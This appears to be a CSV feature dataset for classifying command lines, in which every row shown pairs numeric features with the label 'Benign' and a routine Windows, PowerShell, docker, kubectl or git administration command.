8,1,8.0,2.75,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-015,net user
29,1,29.0,3.8573068568981284,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-016,net localgroup administrators
75,1,75.0,4.282840865134893,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08,0.2978723404255319,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-017,"Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate"
77,1,77.0,4.565061625409204,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.12987012987012986,0.2608695652173913,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-018,"Get-ChildItem -Path C:\Users -Recurse -Filter *.log | Select FullName, Length"
58,1,58.0,4.575159822818812,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1724137931034483,0.15789473684210525,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-019,Copy-Item -Path C:\temp\config.xml -Destination C:\backup\
38,1,38.0,4.113206053476118,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.21052631578947367,0.22727272727272727,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-020,Remove-Item -Path C:\temp\*.tmp -Force
56,1,56.0,4.430222502793967,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.10714285714285714,0.2777777777777778,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-021,New-Item -ItemType Directory -Path C:\Projects\NewFolder
68,1,68.0,4.515494414932971,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1323529411764706,0.1956521739130435,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-022,Compress-Archive -Path C:\Logs -DestinationPath C:\Archives\logs.zip
49,1,49.0,4.230047161830223,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14285714285714285,0.14705882352941177,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-023,Get-Content C:\Windows\System32\drivers\etc\hosts
37,1,37.0,4.499597622210292,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.16216216216216217,0.21739130434782608,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-024,Test-Path C:\Windows\System32\cmd.exe
62,1,62.0,4.836709011755515,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.11290322580645161,0.2702702702702703,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-025,Get-FileHash C:\Windows\System32\notepad.exe -Algorithm SHA256
41,1,41.0,4.63780139475645,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14634146341463414,0.30434782608695654,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-026,Get-Acl C:\Windows\System32 | Format-List
53,1,53.0,4.1989475783432475,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07547169811320754,0.16666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-027,Test-NetConnection -ComputerName google.com -Port 443
26,1,26.0,3.7773627950641684,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07692307692307693,0.15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-028,Resolve-DnsName google.com
59,1,59.0,4.402978219766114,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1016949152542373,0.2631578947368421,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-029,Get-NetTCPConnection | Where-Object State -eq 'Established'
22,1,22.0,3.8796640049025934,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.045454545454545456,0.3125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-030,Get-NetIPConfiguration
17,1,17.0,2.939829017466402,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.23529411764705882,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-031,ping -n 4 8.8.8.8
18,1,18.0,3.3502090290998976,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.05555555555555555,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-032,tracert google.com
22,1,22.0,3.6589934152538053,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.045454545454545456,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-033,nslookup microsoft.com
34,1,34.0,4.24173085589259,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.058823529411764705,0.6470588235294118,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-034,netstat -ano | findstr ESTABLISHED
13,1,13.0,3.3927474104487847,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07692307692307693,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-035,ipconfig /all
6,1,6.0,2.2516291673878226,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.16666666666666666,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-036,arp -a
81,1,81.0,4.618861232313541,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.13580246913580246,0.19607843137254902,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-037,Get-Counter '\Processor(_Total)\% Processor Time' -SampleInterval 2 -MaxSamples 5
82,1,82.0,4.774775102433179,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.13414634146341464,0.27906976744186046,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-038,"Get-Process | Where-Object {$_.WorkingSet64 -gt 100MB} | Select Name, WorkingSet64"
68,1,68.0,4.504773003856491,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07352941176470588,0.30952380952380953,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-039,"Get-CimInstance Win32_LogicalDisk | Select DeviceID, FreeSpace, Size"
73,1,73.0,4.501353586740548,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1643835616438356,0.23255813953488372,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-040,Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'} | Select TaskName
29,1,29.0,3.8404025467025056,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.13793103448275862,0.21052631578947367,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-041,Start-Service -Name 'Spooler'
35,1,35.0,3.85416328885666,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14285714285714285,0.22727272727272727,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-042,Stop-Service -Name 'Spooler' -Force
32,1,32.0,3.9025182662886326,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.125,0.13043478260869565,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-043,Restart-Service -Name 'wuauserv'
50,1,50.0,4.105979129983101,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1,0.20588235294117646,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-044,Set-Service -Name 'Spooler' -StartupType Automatic
45,1,45.0,4.444754974579371,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.06666666666666667,0.2962962962962963,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-045,Get-WinEvent -LogName Security -MaxEvents 100
72,1,72.0,4.761269751406731,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1527777777777778,0.2619047619047619,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-046,Get-WinEvent -FilterHashtable @{LogName='System'; Level=2} -MaxEvents 20
34,1,34.0,3.981296944943374,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.11764705882352941,0.043478260869565216,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-047,wevtutil qe Security /c:10 /f:text
48,1,48.0,4.344841929151772,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08333333333333333,0.21875,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-048,"Get-Module -ListAvailable | Select Name, Version"
25,1,25.0,3.9434651896016457,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08,0.2222222222222222,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-049,Get-ExecutionPolicy -List
68,1,68.0,4.2655867905257505,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.04411764705882353,0.19607843137254902,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-050,Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
15,1,15.0,3.7735572622751845,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.06666666666666667,0.4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-051,$PSVersionTable
26,1,26.0,3.7192945256669785,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.11538461538461539,0.3125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-052,Get-Help Get-Process -Full
43,1,43.0,4.437210684632777,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.20930232558139536,0.13043478260869565,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-053,"dir C:\Windows\System32 /s /b | find "".exe"""
13,1,13.0,3.180832987205441,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07692307692307693,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-054,tasklist /svc
24,1,24.0,4.1053885422075345,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08333333333333333,0.26666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-055,schtasks /query /fo LIST
23,1,23.0,3.6424896731661263,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-056,wmic process list brief
60,1,60.0,4.650489295854282,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08333333333333333,0.4722222222222222,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-057,reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
37,1,37.0,4.371087149178846,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.10810810810810811,0.17391304347826086,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-058,certutil -hashfile C:\file.txt SHA256
29,1,29.0,4.064203408622267,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.034482758620689655,0.17391304347826086,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-059,Import-Module ActiveDirectory
55,1,55.0,4.389917440561371,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09090909090909091,0.2571428571428571,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-060,"Get-ADComputer -Filter * | Select Name, OperatingSystem"
64,1,64.0,4.544758938909887,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09375,0.18181818181818182,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-061,Invoke-Command -ComputerName server01 -ScriptBlock {Get-Process}
58,1,58.0,4.525939943986514,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1724137931034483,0.16216216216216217,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-062,Get-WindowsFeature | Where-Object {$_.Installed -eq $true}
20,1,20.0,3.621928094887362,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.05,0.26666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-063,Get-MpComputerStatus
18,1,18.0,3.7254805569978675,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.05555555555555555,0.21428571428571427,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-064,Update-MpSignature
21,1,21.0,3.6304126608739975,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.047619047619047616,0.25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-065,Get-MpThreatDetection
19,1,19.0,3.7871439606981383,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.05263157894736842,0.2857142857142857,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-066,Get-BitLockerVolume
7,1,7.0,2.807354922057604,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14285714285714285,0.5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-067,Get-Tpm
11,1,11.0,3.277613436819116,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09090909090909091,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-068,gpresult /r
71,1,71.0,4.475913459058832,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.056338028169014086,0.19230769230769232,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-069,Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
38,1,38.0,4.284001448099095,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07894736842105263,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-070,Install-Module -Name PSReadLine -Force
19,1,19.0,3.536886723742167,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.05263157894736842,0.2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-071,Get-InstalledModule
23,1,23.0,3.327484781955842,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.13043478260869565,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-072,choco list --local-only
11,1,11.0,3.0957952550009344,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-073,winget list
12,1,12.0,3.4182958340544896,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08333333333333333,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-074,docker ps -a
13,1,13.0,3.5465935642949384,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-075,docker images
33,1,33.0,3.8997141947882317,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09090909090909091,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-076,kubectl get pods --all-namespaces
10,1,10.0,2.6464393446710153,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-077,git status
21,1,21.0,3.3680424225727155,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14285714285714285,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-078,git log --oneline -10
13,1,13.0,3.3927474104487847,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07692307692307693,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-079,git branch -a
37,1,37.0,4.317033095124793,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08108108108108109,0.5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-080,Get-CimInstance -ClassName Win32_BIOS
71,1,71.0,4.486673879580519,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07042253521126761,0.2608695652173913,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-081,"Get-CimInstance -ClassName Win32_Processor | Select Name, NumberOfCores"
31,1,31.0,4.026619294188053,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.16129032258064516,0.23809523809523808,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-082,[System.Environment]::OSVersion
54,1,54.0,4.609067076590744,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.25925925925925924,0.3448275862068966,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-083,[System.DateTime]::Now.ToString('yyyy-MM-dd HH:mm:ss')
12,1,12.0,3.188721875540867,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08333333333333333,0.375,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-084,Get-TimeZone
11,1,11.0,2.9139770731827523,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09090909090909091,0.25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-085,Get-Culture
31,1,31.0,3.7685547780590207,0,0,0,0,0,0,0,0,0,0,0,0,0,0.06451612903225806,0,0,0,0,0,0,0,0,0,0,0,0,0,0.22580645161290322,0.18181818181818182,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-086,$x = 1 + 2 + 3; Write-Output $x
23,1,23.0,3.7622673906514947,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.21739130434782608,0.3076923076923077,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-087,'Hello World'.ToUpper()
17,1,17.0,3.734521664779752,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.35294117647058826,0.14285714285714285,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-088,[math]::Sqrt(144)
33,1,33.0,4.267076408618962,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.2727272727272727,0.3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-089,1..10 | ForEach-Object { $_ * 2 }
22,1,22.0,3.73215889136457,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.3181818181818182,0.4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-090,(Get-Date).AddDays(-7)
57,1,57.0,4.298083988632038,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07017543859649122,0.14285714285714285,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-091,Write-Host 'System check complete' -ForegroundColor Green
17,1,17.0,3.8521687236032816,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.11764705882352941,4.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-092,$env:COMPUTERNAME
13,1,13.0,3.546593564294939,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.15384615384615385,2.6666666666666665,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-093,$env:USERNAME
20,1,20.0,4.1219280948873624,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.3,0.5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-094,$env:PATH -split ';'
43,1,43.0,4.379298475431077,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.23255813953488372,0.2222222222222222,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-095,[System.Net.Dns]::GetHostEntry('localhost')
31,1,31.0,4.155651552252569,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.25806451612903225,0.4375,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-096,[System.IO.Path]::GetTempPath()
24,1,24.0,4.084962500721156,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.2916666666666667,0.3076923076923077,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-097,[System.Guid]::NewGuid()
79,1,79.0,4.694179286201514,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,0,0,0,0,0.22784810126582278,0.28888888888888886,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-098,[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('test'))
52,1,52.0,4.401866882846276,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.15384615384615385,0.15789473684210525,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-099,[System.Reflection.Assembly]::GetExecutingAssembly()
52,1,52.0,4.842186055004733,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.2692307692307692,0.26666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-100,[System.IO.File]::ReadAllText('C:\temp\config.json')
